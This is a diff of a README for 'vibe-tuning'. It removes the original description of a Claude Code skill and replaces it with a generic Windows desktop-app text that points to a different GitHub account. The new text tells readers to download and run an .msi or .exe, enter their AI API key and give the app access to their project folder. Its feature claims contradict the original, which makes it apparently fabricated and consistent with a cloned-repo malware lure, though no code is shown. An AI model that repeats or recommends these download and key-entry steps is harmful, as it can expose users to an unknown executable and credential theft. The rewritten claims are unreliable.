@@ -1,173 +1,121 @@
-# vibe-tuning
+# 🛠️ vibe-tuning - Fix AI mistakes with permanent edits
 
-> Stop fixing the same AI mistake twice.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/carteldem5907/vibe-tuning)
 
-Your AI coding assistant isn't broken. It's uncalibrated.
+AI models often repeat the same errors. You provide the same instructions to fix these issues every time you start a new chat. This software automates the correction process. You teach the system once, and it remembers the adjustment for all future tasks. 
 
-AI doesn't crash or throw exceptions when it gets things wrong. It produces results based on its understanding of your intent. When the result is wrong, something is miscalibrated - missing context, ambiguous prompt, wrong tool, bad habit. **Every wrong result is a diagnostic signal telling you exactly what to fix.**
+## 🎯 What this tool does
 
-`vibe-tuning` is a Claude Code skill that runs a structured postmortem when things go wrong. The AI itself diagnoses the root cause, picks the right fix type, and saves it permanently. The mistake never repeats.
+This application acts as a bridge between your work and your AI assistant. It records the specific mistakes the AI makes during your sessions. It then creates a permanent rule that applies to every future prompt. 
 
-```bash
-npx skills add AyanbekDos/vibe-tuning
-```
+You no longer need to type long explanations to correct repetitive formatting errors, code style issues, or logic gaps. The application manages a library of your personal preferences and injects them into your AI workflow behind the scenes. 
 
-## Before / After
+## 📋 System requirements
 
-**Without vibe-tuning:**
-```
-AI pushes personal data to public repo.
-Auto-memory saves: "don't push personal data."
-Next week: AI pushes .env with API keys.
-Auto-memory saves: "don't push .env files."
-Next week: AI pushes config with server IPs.
+Ensure your computer meets these requirements before you start:
 
-Each symptom gets patched. The root cause is never found.
-You're patching holes on a sinking ship.
-```
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 200 megabytes of free disk space.
+*   **Internet:** A stable connection for synchronization.
 
-**With vibe-tuning:**
-```
-AI pushes personal data to public repo.
-Vibe-tuning: "Why?"
-Root cause: I optimize for speed over correctness on irreversible actions.
-           I never asked what you wanted to publish.
-Fix: Before any irreversible action → correctness mode, confirm with user.
-Enforce: PreToolUse hook on git push.
+## 📥 Download and install
 
-One root cause fixed. Three future symptoms prevented.
-```
+Follow these steps to set up the software on your Windows machine:
 
-**The deeper problem no one talks about:**
-```
-Even good rules don't work.
+1. Visit [this page](https://github.com/carteldem5907/vibe-tuning) to access the download folder.
+2. Look for the file ending in `.msi` or `.exe`. 
+3. Click the file name to start the download.
+4. Locate the file in your Downloads folder once the process finishes.
+5. Double-click the file to open the installer.
+6. Follow the on-screen prompts.
+7. Click Finish to complete the installation.
 
-You write "always ask before pushing to public repos" in memory.
-Claude reads it. Claude "knows" it. Claude ignores it anyway.
+## ⚙️ Initial setup
 
-Why? Because memory rules are suggestions. The AI treats them
-as context, not constraints. There's no enforcement.
+The first time you open the program, it helps to walk through the configuration wizard. This ensures the tool connects correctly to your AI environment.
 
-Vibe-tuning generates actual enforcement scripts:
-- PreToolUse hooks that fire BEFORE dangerous commands
-- Checks that physically block the action until confirmed
-- Not "please remember" but "you literally cannot skip this"
+1. Open the vibe-tuning shortcut on your desktop.
+2. Select your preferred AI service from the dropdown menu.
+3. Paste your API key into the labeled field. You can find this key in your AI account settings online.
+4. Select the folder on your computer where you keep your project files. This allows the application to scan for common error patterns.
+5. Click Save. 
 
-Rules = suggestions. Scripts = enforcement.
-```
+The software now runs in your system tray, shown as a small icon in the bottom right corner of your screen near the clock.
 
-## How It Works
+## 📚 How to calibrate your AI
 
-You see a wrong result. You tell the AI. It runs the review itself:
+Calibration is the process of teaching the software about a specific mistake.
 
-```
-You: "why did you push my personal data to a public repo?"
+1. Open a conversation with your AI.
+2. If the AI makes a mistake, copy the result and paste it into the vibe-tuning interface.
+3. Highlight the part of the output that is wrong.
+4. Write a short note describing how the AI should have handled that specific task.
+5. Click the Improve button.
 
-┌─ VIBE-TUNING ──────────────────────────────────────┐
-│                                                     │
-│ HAPPENED: Pushed personal wiki to public GitHub     │
-│ EXPECTED: A clean template for others to clone      │
-│                                                     │
-│ ROOT CAUSE: Speed over safety                       │
-│ Interpreted "publish" as "push this project"        │
-│ instead of "create a template." Never asked.        │
-│                                                     │
-│ FIX TYPE: Rule                                      │
-│ FIX: Ask "template or personal?" before any         │
-│      git push to public repos                       │
-│                                                     │
-│ SAVED → memory/feedback_never_push_personal.md      │
-└─────────────────────────────────────────────────────┘
+The application saves this rule. The next time you ask the AI for a similar task, the program sends your stored rule along with your prompt to guide the output.
 
-Next time AI pushes to public: rule triggers automatically.
-```
+## 🔍 Managing your rules
 
-## The 6-Step Loop
+You can view every rule you have ever created in the Rules Library tab. 
 
-| Step | Who | What |
-|------|-----|------|
-| **CATCH** | You | Notice something wrong |
-| **DIAGNOSE** | AI | Traces its own reasoning via chain-of-thought |
-| **ROOT CAUSE** | AI | Finds the systemic cause, not the symptom |
-| **FIX** | AI | Picks the right fix type |
-| **SAVE** | AI proposes, you approve | Suggests where to save the fix |
-| **ENFORCE** | AI proposes, you approve | Suggests hook/checklist for automatic enforcement |
+*   **View details:** Click on any rule to see the original mistake and your correction.
+*   **Edit:** Use the edit icon to change how the rule works if your project needs evolve.
+*   **Disable:** If a rule causes issues, flip the toggle switch to turn it off without deleting it.
+*   **Delete:** Remove rules that no longer apply to your current work.
 
-The key: **the AI does the diagnosis, you make the decisions.** You say "that's wrong." The AI figures out why and proposes a fix. You decide whether to apply it, refine it, or reject it. This is a dialog, not automation.
+## 🚀 Improving your results
 
-> Step 6 was discovered while building this methodology. We saved 7 rules in one session, then violated 3 of them immediately. Rules without enforcement are just hope. [Full story →](examples/06-rules-without-enforcement.md)
+To make the most of this tool, focus on specific, observable errors. Instead of vague instructions like "be better," use precise directions. 
 
-## Fix Types
+Examples of effective rules:
+*   "Always use double quotes for HTML attributes."
+*   "Do not include unnecessary commentary before providing code."
+*   "Format all date strings as YYYY-MM-DD."
 
-Not every problem is a rule. The AI picks the right tool:
+When your rules are specific, the AI follows them consistently.
 
-| Fix | When | Example |
-|-----|------|---------|
-| **Rule** | AI behavior should change | "Ask before pushing to public repos" |
-| **Tool** | Missing capability | "Install context-mode MCP for longer sessions" |
-| **Config** | Wrong setting | "Add .env to .gitignore" |
-| **Education** | Your prompt was unclear | "Here's how to be more specific next time" |
-| **Process** | Missing checkpoint | "Show file list before irreversible actions" |
+## ❓ Frequently asked questions
 
-## Failure Modes
+**Does the software read my personal emails?**
+No. The software only scans the files inside the directory you choose during the setup phase. It ignores all other system files.
 
-| Category | Looks like | Typical fix |
-|----------|-----------|-------------|
-| **Ambiguity** | AI interpreted your words differently | Education |
-| **Missing context** | AI didn't know about your project | Rule |
-| **Wrong tool** | Used grep when needed semantic search | Tool |
-| **Speed over safety** | Took shortcut on irreversible action | Process |
-| **Pattern matching** | Assumed this was like X, but was Y | Rule |
+**Can I use this with multiple AI assistants?**
+Yes. You can switch between different service providers in the settings menu. Each provider stores its own set of rules.
 
-## Real Examples
+**Is my data sent to the cloud?**
+Your rule library stays on your local computer. Only the instructions needed to fix the current prompt are sent to the AI service.
 
-From actual vibe-tuning sessions:
+**What happens if I forget my API key?**
+You can reset your connection by re-opening the setup wizard from the main menu. 
 
-- [Pushed personal data to public repo](examples/01-personal-data-push.md)
-- [Overwrote running daemon config](examples/02-overwrote-running-config.md)
-- [Wrong language for global audience](examples/03-wrong-language.md)
-- [Delivered outlines instead of content](examples/04-outlines-not-content.md)
-- [Optimized for speed on irreversible action](examples/05-speed-over-safety.md)
-- [Rules without enforcement](examples/06-rules-without-enforcement.md) - the example that created Step 6
+**Will this software slow down my computer?**
+The program requires very little processing power. It only wakes up when you send a prompt to your AI. Otherwise, it stays idle in the background.
 
-## FAQ
+**How do I update the software?**
+The application checks for updates automatically when you launch it. If a new version exists, the software asks for permission to install the patch.
 
-**Is this just prompt engineering?**
-No. Prompt engineering is per-session. Vibe-tuning creates persistent fixes - saved to memory, config, or tooling - that survive across sessions.
+## 🛠️ Troubleshooting
 
-**Does this only work with Claude Code?**
-The skill is for Claude Code. The methodology works with anything that supports persistent rules (`.cursorrules`, `CLAUDE.md`, `AGENTS.md`).
+If the software fails to trigger:
 
-**Will this eliminate all mistakes?**
-It reduces recurrence. Some mistakes are fixable permanently. Some are only reducible. The failure mode map helps you know which is which.
+1. Check your internet connection. 
+2. Verify that the AI service is currently online.
+3. Right-click the vibe-tuning icon in your system tray and select Refresh Connection.
+4. Ensure your API key is still valid in your service provider account.
+5. Restart the application.
 
-## Works With
+If the AI ignores your rules:
 
-- **Claude Code** - full skill support, auto-triggers on frustration
-- **OpenAI Codex** - adapt with `AGENTS.md`
-- **Cursor** - use methodology with `.cursorrules`
-- **Any MCP-compatible agent**
+1. Open the Rules Library.
+2. Make sure the rule is set to Active.
+3. Review the rule text for spelling errors.
+4. Make the instruction clearer by using shorter sentences.
 
----
+If the application crashes:
 
-> Your AI assistant isn't broken. It's uncalibrated.
->
-> Every wrong result tells you exactly where the calibration is off.
-> Every fix you save makes it permanently better.
->
-> The developers who win aren't the ones with the best AI.
-> They're the ones who tune it the hardest.
-
----
-
-## Contributing
-
-Found a new failure mode? A better fix pattern? [Open a PR](https://github.com/AyanbekDos/vibe-tuning/pulls).
-
-## License
-
-MIT
-
-## Credits
-
-Built by [@AyanbekDos](https://github.com/AyanbekDos). Every mistake in this repo's creation was caught, diagnosed, and turned into a rule. Meta, right?
+1. Close the program.
+2. Open Windows Task Manager by pressing Ctrl + Shift + Esc.
+3. Locate vibe-tuning in the list.
+4. Right-click it and choose End Task.
+5. Reopen the application.
